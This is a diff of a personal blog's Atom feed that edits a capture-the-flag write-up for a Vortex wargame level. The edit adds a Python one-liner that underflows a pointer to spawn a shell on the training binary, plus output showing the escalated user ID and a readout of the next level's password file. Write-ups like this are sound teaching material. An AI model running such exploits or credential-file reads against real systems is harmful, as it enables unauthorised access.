@@ -4,7 +4,7 @@
   <title><![CDATA[Category: Programming & Software | David Xia]]></title>
   <link href="https://www.davidxia.com/categories/programming-and-software/atom.xml" rel="self"/>
   <link href="https://www.davidxia.com/"/>
-  <updated>2020-12-26T16:52:12-05:00</updated>
+  <updated>2020-12-26T17:18:54-05:00</updated>
   <id>https://www.davidxia.com/</id>
   <author>
     <name><![CDATA[David Xia]]></name>
@@ -302,10 +302,16 @@ Since ASLR is disabled, this location is fixed.</p>
 
 <p>I first thought of a brute-force strategy of decrementing <code>ptr</code>&rsquo;s value with <code>\</code> until its highest
 byte was <code>0xca</code>. That way, when it&rsquo;s bit-wise ANDed with <code>0xff000000</code>, the result would be
-<code>0xca000000</code>. The exploit command would be the following.</p>
+<code>0xca000000</code>. The exploit would be the following.</p>
 
-<pre><code>(python -c 'import sys; sys.stdout.write("\\" * (0xffffe470-0xcaffffff) + "\x00")'; cat) \
+<pre><code>(python -c 'import sys; sys.stdout.write("\\" * (0xffffe470 - 0xcaffffff) + "\x00")'; cat) \
   | /vortex/vortex1
+
+id
+uid=5002(vortex2) gid=5001(vortex1) groups=5002(vortex2),5001(vortex1)
+
+cat /etc/vortex_pass/vortex2
+23anbT\rE
 </code></pre>
 
 <p>Aside: the Python command is run in a subshell with an extra <code>cat</code> to keep the <code>/bin/sh</code> listening
@@ -313,11 +319,11 @@ to more input from the stdout of that subshell. That way we can add more command
 terminal. The Python command triggers the <code>/bin/sh</code>. The <code>cat</code> with no args just reads from the
 current stdin and feeds data to <code>/bin/sh</code>. See this <a href="https://security.stackexchange.com/a/155845/4350">Stack Exchange answer</a>.</p>
 
-<p>This is most definitely not the &ldquo;right&rdquo; solution because 0xffffd5dc - 0xcaffffff = 0x34ffd5dd =
+<p>This is definitely not the best solution because 0xffffd5dc - 0xcaffffff = 0x34ffd5dd =
 889,181,661. If written to disk, this file be almost a gigabyte.</p>
 
 <p>Let&rsquo;s think of a better solution. There&rsquo;s no lower bound checking on <code>ptr</code>&rsquo;s value. So we can
-decrement the value of ptr until it references its own memory address which starts at <code>0xffffd4d4</code>.
+decrement the value of <code>ptr</code> until it references its own memory address which starts at <code>0xffffd4d4</code>.
 Then we write <code>0xca</code> into the highest byte at <code>0xffffd4d7</code>. <code>ptr</code>&rsquo;s value is initialized to
 <code>0xffffd5dc</code>. So we write this many <code>\</code>: 0xffffd5dc - 0xffffd4d7 = 0x105 = 261. Instead of the
 seemingly arbitrary 261, we&rsquo;ll use 512/2 + 5. This is more descriptive because it shows we&rsquo;re moving
